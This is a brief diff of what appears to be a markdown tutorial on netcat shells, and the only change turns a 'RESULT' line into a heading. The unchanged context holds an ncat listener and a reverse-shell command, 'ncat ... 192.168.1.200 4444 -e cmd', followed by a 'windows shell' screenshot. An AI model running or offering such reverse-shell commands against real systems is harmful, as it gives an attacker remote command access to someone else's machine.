@@ -32,7 +32,7 @@ ncat -l -v 4444
 ```bash
 ncat -v 192.168.1.200 4444 -e cmd
 ```
-RESULT >
+# RESULT >
 ![windows shell](https://user-images.githubusercontent.com/97669969/154819759-1af4849a-9bc7-4e86-a5e2-42a834a89e58.jpg)
 
 
